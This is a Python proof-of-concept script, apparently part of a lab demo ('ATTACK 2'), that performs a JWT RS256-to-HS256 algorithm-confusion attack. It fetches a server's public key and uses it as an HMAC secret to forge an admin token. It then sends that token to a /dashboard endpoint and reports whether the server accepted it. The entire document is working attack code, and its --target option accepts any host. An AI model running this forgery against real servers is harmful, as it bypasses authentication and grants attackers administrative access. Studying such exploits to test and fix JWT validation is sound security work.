import base64, json, hmac, hashlib, requests, sys, argparse

TARGET = "http://127.0.0.1:5000"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge_token(public_key_pem: str, user: str, role: str) -> str:
    # PyJWT blocks RSA keys as HMAC secrets, so we implement HS256 manually
    # Strip PEM headers to get raw base64, then decode to bytes
    raw = "".join(public_key_pem.strip().splitlines()[1:-1])
    key_bytes = base64.b64decode(raw)

    header  = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"user": user, "role": role}).encode())
    signing_input = f"{header}.{payload}".encode()

    sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"

def main():
    parser = argparse.ArgumentParser(description="JWT RS256→HS256 algorithm confusion PoC")
    parser.add_argument("--target", default=TARGET)
    parser.add_argument("--user",   default="attacker")
    parser.add_argument("--role",   default="admin")
    parser.add_argument("--demo",   action="store_true")
    args = parser.parse_args()

    if args.demo:
        print("\n[*] ATTACK 2: RS256 → HS256 Algorithm Confusion")
        print("[*] Server allows HS256 in jwt.decode() alongside RS256.")
        print("[*] PyJWT server-side uses the RSA public key as the HMAC secret.")
        print("[*] We know the public key (it's exposed at /public-key), so we")
        print("[*] sign a forged payload with it manually using HMAC-SHA256.\n")

    if args.demo:
        print(f"[*] Fetching public key from {args.target}/public-key ...")
    public_key = requests.get(f"{args.target}/public-key").text
    if args.demo:
        print("[+] Public key obtained\n")

    if args.demo:
        print(f"[*] Forging token: user={args.user}, role={args.role}")
    token = forge_token(public_key, args.user, args.role)
    if args.demo:
        print(f"[+] Forged token:\n    {token}\n")
        print(f"[*] Sending to {args.target}/dashboard ...\n")

    resp = requests.get(
        f"{args.target}/dashboard",
        headers={"Authorization": f"Bearer {token}"}
    )

    if args.demo:
        print(f"{'[+]' if resp.status_code == 200 else '[-]'} Server responded {resp.status_code}\n")

    try:
        body = resp.json()
    except Exception:
        body = resp.text

    print(json.dumps(body, indent=2) if isinstance(body, dict) else body)

    if resp.status_code == 200:
        print("\n[!] VULNERABLE — server accepted forged HS256 token")
        sys.exit(0)
    else:
        print("\n[-] Attack failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
